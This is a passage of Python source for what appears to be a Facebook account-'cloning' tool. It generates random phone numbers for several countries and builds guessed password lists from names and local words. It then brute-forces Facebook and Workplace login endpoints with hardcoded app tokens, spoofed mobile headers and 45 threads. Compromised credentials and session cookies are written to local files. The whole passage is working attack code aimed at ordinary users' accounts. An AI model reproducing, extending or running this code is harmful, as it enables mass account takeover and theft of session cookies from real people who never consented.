            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'X-FB-Lite-Version': '1.9.0',
            'X-FB-Connection-Type': 'MOBILE.2G',
            'X-FB-HTTP-Engine': 'Liger'
        }
        
        try:
            response = requests.post(
                'https://b-api.facebook.com/method/auth.login',
                data=data,
                headers=headers,
                timeout=30
            ).json()
            
            if 'session_key' in response:
                coki = ";".join(i["name"]+"="+i["value"] for i in response["session_cookies"])
                uid = response['uid']
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                open('/sdcard/GEN-FILE-M9-FB-LITE-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in response.get('error', {}).get('message', ''):
                uid = response['error']['error_data']['uid']
                if 'y' in pcp:
                    year = tutulx(str(uid))
                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                    os.system('espeak -a 300 "Cp"')
                open('/sdcard/GEN-FILE-M9-FB-LITE-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
                
        except Exception as e:
            continue
            
    loop += 1

#------------->> FILE METHOD M10 LEGACY API >>-------------#
def ___M_T_H_D_10___(ids,names,passlist):
    global loop,oks,cps
    xp=f"{bx}[{gx}MR{bx}]{gx}"
    sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s '%(loop,len(oks)));sys.stdout.flush()
    
    fn = names.split(' ')[0]
    try:
        ln = names.split(' ')[1]
    except:
        ln = fn
        
    for pw in passlist:
        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
        
        # Legacy API endpoint with older security
        ua = generate_wv_ua()
        
        data = {
            'api_key': '882a8490361da98702bf97a021ddc14d',
            'email': ids,
            'format': 'JSON',
            'locale': 'en_US',
            'method': 'auth.login',
            'password': pas,
            'return_ssl_resources': '0',
            'v': '1.0'
        }
        
        headers = {
            'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip'
        }
        
        try:
            response = requests.post(
                'https://api.facebook.com/restserver.php',
                data=data,
                headers=headers,
                timeout=30
            ).json()
            
            if 'uid' in response:
                uid = response['uid']
                # Legacy API doesn't provide session cookies, so we'll use basic auth
                coki = f"c_user={uid}; xs=legacy_auth"
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                open('/sdcard/GEN-FILE-M10-LEGACY-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'error_msg' in response:
                if 'y' in pcp:
                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {ids} | {pas}')
                    os.system('espeak -a 300 "Cp"')
                open('/sdcard/GEN-FILE-M10-LEGACY-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
                
        except Exception as e:
            continue
            
    loop += 1

#------------->> FILE METHOD M11 WORKPLACE/FACEBOOK BUSINESS >>-------------#
def ___M_T_H_D_11___(ids,names,passlist):
    global loop,oks,cps
    xp=f"{bx}[{gx}MR{bx}]{gx}"
    sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s '%(loop,len(oks)));sys.stdout.flush()
    
    fn = names.split(' ')[0]
    try:
        ln = names.split(' ')[1]
    except:
        ln = fn
        
    for pw in passlist:
        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
        
        # Workplace/Business user agent
        ua = generate_wv_ua()
        
        data = {
            'email': ids,
            'password': pas,
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'format': 'json',
            'sdk_version': '2',
            'locale': 'en_US',
            'client_country_code': 'US',
            'method': 'auth.login',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.workplace.protocol.AuthHandler',
            'generate_session_cookies': '1',
            'generate_analytics_claim': '1',
            'credentials_type': 'password',
            'source': 'workplace_login',
            'error_detail_type': 'button_with_disabled',
            'machine_id': str(uuid.uuid4()),
            'meta_inf_fbmeta': '',
            'advertiser_id': str(uuid.uuid4()),
            'currently_logged_in_userid': '0'
        }
        
        headers = {
            'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip, deflate',
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True'
        }
        
        try:
            response = requests.post(
                'https://graph.facebook.com/auth/login',
                data=data,
                headers=headers,
                timeout=30
            ).json()
            
            if 'session_key' in response:
                coki = ";".join(i["name"]+"="+i["value"] for i in response["session_cookies"])
                uid = response['uid']
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                open('/sdcard/GEN-FILE-M11-WORKPLACE-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in response.get('error', {}).get('message', ''):
                uid = response['error']['error_data']['uid']
                if 'y' in pcp:
                    year = tutulx(str(uid))
                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                    os.system('espeak -a 300 "Cp"')
                open('/sdcard/GEN-FILE-M11-WORKPLACE-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
                
        except Exception as e:
            continue
            
    loop += 1

#------------->> FILE METHOD M12 INSTAGRAM CROSS-AUTH >>-------------#
def ___M_T_H_D_12___(ids,names,passlist):
    global loop,oks,cps
    xp=f"{bx}[{gx}MR{bx}]{gx}"
    sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s '%(loop,len(oks)));sys.stdout.flush()
    
    fn = names.split(' ')[0]
    try:
        ln = names.split(' ')[1]
    except:
        ln = fn
        
    for pw in passlist:
        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
        
        # Instagram user agent
        ua = "Instagram 276.0.0.0.0 Android (28/9; 480dpi; 1080x1920; samsung; SM-G965F; star2lte; samsungexynos9810; en_US; 439786257)"
        
        # First try Instagram credentials on Facebook
        data = {
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': ids,
            'password': pas,
            'generate_analytics_claims': '1',
            'credentials_type': 'password',
            'source': 'instagram_cross_login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.crossposting.protocol.AuthHandler',
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        }
        
        headers = {
            'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-IG-App-ID': '439786257',
            'X-FB-HTTP-Engine': 'Liger'
        }
        
        try:
            response = requests.post(
                'https://b-graph.facebook.com/auth/login',
                data=data,
                headers=headers,
                timeout=30
            ).json()
            
            if 'session_key' in response:
                coki = ";".join(i["name"]+"="+i["value"] for i in response["session_cookies"])
                uid = response['uid']
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                open('/sdcard/GEN-FILE-M12-INSTAGRAM-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in response.get('error', {}).get('message', ''):
                uid = response['error']['error_data']['uid']
                if 'y' in pcp:
                    year = tutulx(str(uid))
                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                    os.system('espeak -a 300 "Cp"')
                open('/sdcard/GEN-FILE-M12-INSTAGRAM-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
                
        except Exception as e:
            continue
            
    loop += 1

#------------->> FILE METHOD M13 FREE BASICS >>-------------#
def ___M_T_H_D_13___(ids,names,passlist):
    global loop,oks,cps
    xp=f"{bx}[{gx}MR{bx}]{gx}"
    sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s '%(loop,len(oks)));sys.stdout.flush()
    
    session = requests.Session()
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
            
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            
            # Free Basics user agent
            ua = generate_wv_ua()
            
            # Get login page first
            login_page = session.get('https://mbasic.facebook.com/login/')
            
            # Extract form data
            lsd_match = re.search(r'name="lsd" value="(.*?)"', login_page.text)
            jazoest_match = re.search(r'name="jazoest" value="(\d+)"', login_page.text)
            
            data = {
                'lsd': lsd_match.group(1) if lsd_match else 'AVrSdvFQZv4',
                'jazoest': jazoest_match.group(1) if jazoest_match else '2580',
                'email': ids,
                'pass': pas,
                'login': 'Log In',
                'fbapp_id': 'freebasics',
                'refsrc': 'deprecated',
                'lwv': '100'
            }
            
            headers = {
                'User-Agent': ua,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://mbasic.facebook.com',
                'Referer': 'https://mbasic.facebook.com/login/',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
            }
            
            response = session.post(
                'https://mbasic.facebook.com/login/device-based/regular/login/',
                data=data,
                headers=headers,
                allow_redirects=True
            )
            
            # Check for successful login
            if 'c_user' in session.cookies.get_dict():
                coki = ";".join([f"{key}={value}" for key, value in session.cookies.get_dict().items()])
                uid = session.cookies.get_dict().get('c_user')
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                open('/sdcard/GEN-FILE-M13-FREE-BASICS-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'checkpoint' in session.cookies.get_dict():
                uid = session.cookies.get_dict().get('c_user', ids)
                if 'y' in pcp:
                    year = tutulx(str(uid))
                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                    os.system('espeak -a 300 "Cp"')
                open('/sdcard/GEN-FILE-M13-FREE-BASICS-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
                
    except Exception as e:
        pass
        
    loop += 1

#------------->> FILE METHOD M14 FACEBOOK GAMING >>-------------#
def ___M_T_H_D_14___(ids,names,passlist):
    global loop,oks,cps
    xp=f"{bx}[{gx}MR{bx}]{gx}"
    sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s '%(loop,len(oks)));sys.stdout.flush()
    
    fn = names.split(' ')[0]
    try:
        ln = names.split(' ')[1]
    except:
        ln = fn
        
    for pw in passlist:
        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
        
        # Facebook Gaming user agent
        ua = generate_wv_ua()
        
        data = {
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': ids,
            'password': pas,
            'generate_analytics_claims': '1',
            'credentials_type': 'password',
            'source': 'fb_gaming_login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.gaming.protocol.AuthHandler',
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'gaming_platform': 'android'
        }
        
        headers = {
            'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Gaming-Platform': 'android'
        }
        
        try:
            response = requests.post(
                'https://graph.facebook.com/auth/login',
                data=data,
                headers=headers,
                timeout=30
            ).json()
            
            if 'session_key' in response:
                coki = ";".join(i["name"]+"="+i["value"] for i in response["session_cookies"])
                uid = response['uid']
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                open('/sdcard/GEN-FILE-M14-GAMING-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in response.get('error', {}).get('message', ''):
                uid = response['error']['error_data']['uid']
                if 'y' in pcp:
                    year = tutulx(str(uid))
                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                    os.system('espeak -a 300 "Cp"')
                open('/sdcard/GEN-FILE-M14-GAMING-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
                
        except Exception as e:
            continue
            
    loop += 1

#------------->> RANDOM MAIN MENU >>-------------#
country_map = {'1': 'BANGLADESH','2': 'MALAYSIA','3': 'INDIA','4': 'NEPAL','5': 'PAKISTAN','6': 'AFGHANISTAN','7': 'NIGERIA','8': 'USA','9': 'INDONESIA'}
def ____R_A_N_D_O_M____():
    clear();print(f'{xd1} START BANGLADESH RANDOM CLONING ');print(f'{xd2} START MALAYSIA RANDOM CLONING ');print(f'{xd3} START INDIA RANDOM CLONING ');print(f'{xd4} START NEPAL RANDOM CLONING ');print(f'{xd5} START PAKISTAN RANDOM CLONING ');print(f'{xd6} START AFGHANISTAN RANDOM CLONING ');print(f'{xd7} START NIGERIA RANDOM CLONING ');print(f'{xd8} START UNITED STATES RANDOM CLONING ');print(f'{xd9} START INDONESIA RANDOM CLONING ');linex();___O_P_T_I_O_N___ = input(f'{xdx} SELECTION {bx}:{wx} ')
    if ___O_P_T_I_O_N___ in country_map:pookie.append(___O_P_T_I_O_N___);___A_L_L_C_O_U_N_T_Y___(___O_P_T_I_O_N___)
    else:linex();print(f'{xd}{rx} WRONG OPTION SELECTION ');time.sleep(3);____R_A_N_D_O_M____()

def ___A_L_L_C_O_U_N_T_Y___(___O_P_T_I_O_N___):
    clear()
    if '1' in pookie:print(f"{xd} EXAMPLE {bx}:{gx} 016 {bx}|{gx} 017 {bx}|{gx} 018 {bx}|{gx} 019 ");linex()
    elif '2' in pookie:print(f"{xd} EXAMPLE {bx}:{gx} 01128 {bx}|{gx} 011** {bx}|{gx} 012** ");linex()
    elif '3' in pookie:print(f"{xd} EXAMPLE {bx}:{gx} 6383 {bx}|{gx} 8795 {bx}|{gx} 9670 {bx}|{gx} 9163 ");linex()
    elif '4' in pookie:print(f"{xd} EXAMPLE {bx}:{gx} 9840 {bx}|{gx} 9861 {bx}|{gx} 9815 {bx}|{gx} 9814 ");linex()
    elif '5' in pookie:print(f"{xd} EXAMPLE {bx}:{gx} 0318 {bx}|{gx} 0306 {bx}|{gx} 0335 {bx}|{gx} 0345 ");linex()
    elif '6' in pookie:print(f"{xd} EXAMPLE {bx}:{gx} +9350 {bx}|{gx} +9330 {bx}|{gx} +9360 {bx}|{gx} +9340 ");linex()
    elif '7' in pookie:print(f"{xd} EXAMPLE {bx}:{gx} 070 {bx}|{gx} 080 {bx}|{gx} 081 {bx}|{gx} 091 ");linex()
    elif '8' in pookie:print(f"{xd} EXAMPLE {bx}:{gx} 941 {bx}|{gx} 816 {bx}|{gx} 308 {bx}|{gx} 225 ");linex()
    elif '9' in pookie:print(f"{xd} INPUT YOUR INDONESIA COUNTRY SIM CODE");linex()
    code = input(f'{xdx} ENTER SIM CODE {bx}:{wx} ');linex();print(f"{xd} EXAMPLE {bx}:{gx} 3000 {bx}|{gx} 5000 {bx}|{gx} 10000 {bx}|{gx} 99999 ");linex();limit=int(input(f'{xdx} ENTER LIMIT {bx}:{wx} '))
    clear();print(f'{xd1} METHOD {wx}~{gx} M1');print(f'{xd2} METHOD {wx}~{gx} M2');print(f'{xd3} METHOD {wx}~{gx} M3');print(f'{xd4} METHOD {wx}~{gx} M4');print(f'{xd5} METHOD {wx}~{gx} M5');print(f'{xd6} METHOD {wx}~{gx} M6');linex();___M_T_D___ = input(f'{xd} ENTER METHOD {bx}:{wx} ')
    clear();___S_P___ = input(f'{xd} DO YOU WENT SHOW CP UID {bx}:{wx} {wx}({gx}y{bx}/{rx}n{wx}) ')
    if ___S_P___ in ['y','Y','yes','Yes','1']:pcp.append('y')
    else:pcp.append('n')
    for nmbr in range(int(limit)):
        if "1" in pookie:numberx = ''.join(random.choice(string.digits) for _ in range(8));user.append(numberx)
        elif "2" in pookie:numberxx = ''.join(random.choice(string.digits) for _ in range(6));user.append(numberxx)
        elif "3" in pookie:numberxx = ''.join(random.choice(string.digits) for _ in range(7));user.append(numberxx)
        elif "4" in pookie:numberxx = ''.join(random.choice(string.digits) for _ in range(6));user.append(numberxx)
        elif "5" in pookie:numberxx = ''.join(random.choice(string.digits) for _ in range(7));user.append(numberxx)
        elif "6" in pookie:numberxx = ''.join(random.choice(string.digits) for _ in range(7));user.append(numberxx)
        elif "7" in pookie:numberxx = ''.join(random.choice(string.digits) for _ in range(8));user.append(numberxx)
        elif "8" in pookie:numberxx = ''.join(random.choice(string.digits) for _ in range(8));user.append(numberxx)
        elif "9" in pookie:numberxx = ''.join(random.choice(string.digits) for _ in range(8));user.append(numberxx)
    with tred(max_workers=45) as ___P_R_O___:
        clear();tl = str(len(user))
        country_name = country_map.get(___O_P_T_I_O_N___, "UNKNOWN")
        print(f'{xd} OPERATOR{bx}|{gx}LIMIT{bx}|{gx}METHOD {bx}:{wx} {code}{bx}|{wx}{tl}{bx}|{wx}M{___M_T_D___}\n{xd} CLONING COUNTRY {bx}:{wx} {country_name}');print (f'{xd} FLIGHT MODE {wx}ON{bx}|{wx}OFF{gx} EVERY {wx}3{gx} MINUTES ');linex()
        for love in user:
            ids = code + love
            if "1" in pookie:passlist=[ids,love,ids[:6],ids[:7],ids[:8],ids[5:]]
            elif "2" in pookie:passlist=[ids,love,ids[:7],ids[:6],ids[:8]]
            elif "3" in pookie:passlist=[ids,love,ids[:6],"57273200","57575751","59039200"]
            elif "4" in pookie:passlist=[ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
            elif "5" in pookie:passlist=[ids,love,ids[5:],'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
            elif "6" in pookie:passlist=[love,ids,'afghan','afghan12345','Afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786','50006000']
            elif "7" in pookie:passlist=[ids,love,ids[:8],ids[:7],ids[:9],ids[:11],ids[:6],ids[:10],"500500","200200","1234567","nigeria","ronaldo","muhammad","abubakar","hassan","adebayo"]
            elif "8" in pookie:passlist=[ids,love,"500500","200200"]
            elif "9" in pookie:passlist=[ids,love,"indonesia","200200","first123","first12"]
            if ___M_T_D___ in ['1']:___P_R_O___.submit(____M_E_T_H_O_D_A____,ids,passlist,tl)
            elif ___M_T_D___ in ['2']:___P_R_O___.submit(____M_E_T_H_O_D_B____,ids,passlist,tl)
            elif ___M_T_D___ in ['3']:___P_R_O___.submit(____M_E_T_H_O_D_C____,ids,passlist,tl)
            elif ___M_T_D___ in ['4']:___P_R_O___.submit(____M_E_T_H_O_D_D____,ids,passlist,tl)
            elif ___M_T_D___ in ['5']:___P_R_O___.submit(____M_E_T_H_O_D_E____,ids,passlist,tl)
            elif ___M_T_D___ in ['6']:___P_R_O___.submit(____M_E_T_H_O_D_F____,ids,passlist,tl)
    print(f"\n{wx}{47*'-'}");print(f'{xd} THE PROCESS HAS COMPLETED');print(f"{xd} TOTAL OK IDS {bx}:{gx} {len(oks)}");print(f"{xd} TOTAL CP IDS {bx}:\x1b[38;5;205m {len(cps)}");print(f"{wx}{47*'-'}");exit()

#------------->> RANDOM METHOD M1 B-GRAPH >>-------------#
def ____M_E_T_H_O_D_A____(ids,passlist,tl):
        global loop,oks,cps
        xp=f"{bx}[{gx}MR{bx}]{gx}"
        sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s '%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839","currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d",}
                        headers = {'User-Agent': ____U_A_1____(),'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': '45204','X-FB-SIM-HNI': '45201','X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62','Content-Length': '698'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                year = tutulx(str(uid))
                                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                os.system('espeak -a 300 "GEN,  Ok,  id"')
                                print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                                open('/sdcard/GEN-M1-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                oks.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                uid = po['error']['error_data']['uid']
                                if 'y' in pcp:
                                    year = tutulx(str(uid))
                                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                    os.system('espeak -a 300 "Cp"')
                                open('/sdcard/GEN-M1-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
        except Exception as e:pass

#------------->> RANDOM METHOD M2 GRAPH >>-------------#
def ____M_E_T_H_O_D_B____(ids,passlist,tl):
        global loop,oks,cps
        xp=f"{bx}[{gx}MR{bx}]{gx}"
        sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s '%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','fb_api_req_friendly_name':'authenticate',}
                        headers = {'Authorization':f'OAuth {accessToken}','X-FB-Friendly-Name':'authenticate','X-FB-Connection-Type':'unknown','User-Agent':generate_wv_ua(),'Accept-Encoding':'gzip, deflate','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                year = tutulx(str(uid))
                                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                os.system('espeak -a 300 "GEN,  Ok,  id"')
                                print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                                open('/sdcard/GEN-M2-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                oks.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                uid = po['error']['error_data']['uid']
                                if 'y' in pcp:
                                    year = tutulx(str(uid))
                                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                    os.system('espeak -a 300 "Cp"')
                                open('/sdcard/GEN-M2-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
        except Exception as e:pass

#------------->> RANDOM METHOD M3 >>-------------#
def ____M_E_T_H_O_D_C____(ids,passlist,tl):
        global loop,oks,cps
        xp=f"{bx}[{gx}MR{bx}]{gx}"
        sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s '%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        data = {'adid':adid,'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,"logged_out_id": str(uuid.uuid4()),"hash_id": str(uuid.uuid4()),"reg_instance": str(uuid.uuid4()),"session_id": str(uuid.uuid4()),"advertiser_id": str(uuid.uuid4()),'generate_analytics_claims':'1','credentials_type':'password','source':'login',"sim_country": "id","network_country": "id","relative_url": "method/auth.login",'error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','fb_api_req_friendly_name':'authenticate',"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
